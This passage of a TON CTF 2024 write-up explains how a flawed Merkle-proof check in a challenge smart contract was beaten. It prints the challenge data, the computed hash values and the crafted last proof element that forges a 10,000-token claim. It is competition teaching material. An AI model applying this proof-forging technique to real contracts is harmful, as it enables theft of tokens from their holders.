        <span class=nx>sha256</span><span class=p>((</span><span class=nx>proof</span><span class=o>!!</span> <span class=o>-</span> <span class=nx>leaf</span><span class=p>).</span><span class=nx>toString</span><span class=p>());</span>
        <span class=nx>i</span> <span class=o>=</span> <span class=nx>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
    <span class=p>}</span>
    <span class=k>return</span> <span class=nx>leaf</span> <span class=o>==</span> <span class=nx>self</span><span class=p>.</span><span class=nx>merkleRoot</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table></div></div><p>Instead of the standard hashing approach, this implementation allowed us to manipulate the proof. By controlling the final input passed to the <code>sha256</code> function, we could fabricate a valid proof based on a known hash.</p><h3 id=the-exploit-2>The Exploit</h3><p>To exploit the vulnerability, I only needed to modify the <strong>last proof element</strong> while keeping the earlier proofs intact. This adjustment let me control the input to the final <code>sha256</code> operation, allowing me to bypass the verification process.</p><p>The challenge provided a set of data for the Merkle Tree verification:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-ts data-lang=ts><span class=kd>let</span> <span class=nx>seedBuilder</span>: <span class=kt>StringBuilder</span> <span class=o>=</span> <span class=nx>beginString</span><span class=p>();</span>
<span class=nx>seedBuilder</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=s2>&#34;EQDaypwc_Jr8by-alaK4mntRu35_EhlMz60AOeSJRawcrNM0&#34;</span><span class=p>);</span>
<span class=nx>seedBuilder</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=s2>&#34;614&#34;</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>leaf</span>: <span class=kt>Int</span> <span class=o>=</span> <span class=nx>sha256</span><span class=p>(</span><span class=nx>seedBuilder</span><span class=p>.</span><span class=nx>toString</span><span class=p>());</span>

<span class=kd>let</span> <span class=nx>nodes</span>: <span class=kt>map</span><span class=p>&lt;</span><span class=nt>Int</span><span class=err>,</span> <span class=na>Int</span><span class=p>&gt;</span> <span class=o>=</span> <span class=nx>emptyMap</span><span class=p>();</span>
<span class=nx>nodes</span><span class=p>.</span><span class=kr>set</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>3276839473039418448246626220846442448842246862622804046064860066224006800084</span><span class=p>);</span>
<span class=nx>nodes</span><span class=p>.</span><span class=kr>set</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>47247882347545520880400048062206626448448620004800866600228646060442282848824</span><span class=p>);</span>
<span class=nx>nodes</span><span class=p>.</span><span class=kr>set</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>17983245880419772846408460262448682866408688862244064640442682866626888428288</span><span class=p>);</span>
</code></pre></td></tr></table></div></div><p>Using the valid leaf, in the while loop, I dumped the values passed to the <code>sha256</code> function to analyze the last round’s parameters.</p><p>To modify the claim amount, I changed the target <code>leaf</code> value to represent a claim of <strong>10,000 tokens</strong>. By adjusting the last proof value, I could ensure the <code>sha256</code> input matched the expected value.</p><p>For example:</p><ul><li>Original final <code>sha256</code> input: <code>90114452958426129291090095054266392995908099809161431530770587638743766783525</code></li><li>Modified final <strong>leaf</strong> value for a 10,000 token claim: <code>108097698838845902137498555316715075862316788671405496171213270505370655211813</code></li></ul><p>Given $leaf > target$, we can set the last entry of proofs to <code>leaf-target</code> which is <code>17983245880419772846408460262448682866408688862244064640442682866626888428288</code> to bypass the verification.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2024-09-28</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://leoq7.com/2024/09/TON-CTF-2024/ data-title="TON CTF 2024 Writeup" data-via=LeoQ7_ data-hashtags=Web3,CTF,TON><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://leoq7.com/2024/09/TON-CTF-2024/ data-hashtag=Web3><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://leoq7.com/2024/09/TON-CTF-2024/ data-title="TON CTF 2024 Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://leoq7.com/2024/09/TON-CTF-2024/ data-title="TON CTF 2024 Writeup"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://leoq7.com/2024/09/TON-CTF-2024/ data-title="TON CTF 2024 Writeup"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/Web3/>Web3</a>,&nbsp;<a href=/tags/CTF/>CTF</a>,&nbsp;<a href=/tags/TON/>TON</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023/09/MetaTrust-CTF-Sui/ class=prev rel=prev title="2023 MetaTrust Web3 Security CTF Sui Challenges Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>2023 MetaTrust Web3 Security CTF Sui Challenges Writeup</a></div></div><div id=comments><div id=utterances class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2020 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Qi Qin</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/css/lightgallery-bundle.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/lightgallery.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lightgallery@2.4.0/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js></script><script type=text/javascript>window.config={code:{maxShownLines:50},comment:{utterances:{darkTheme:"github-dark",issueTerm:"og:title",label:"",lightTheme:"github-light",repo:"LeoQ7/LeoQ7-comments"}},lightgallery:!0,math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>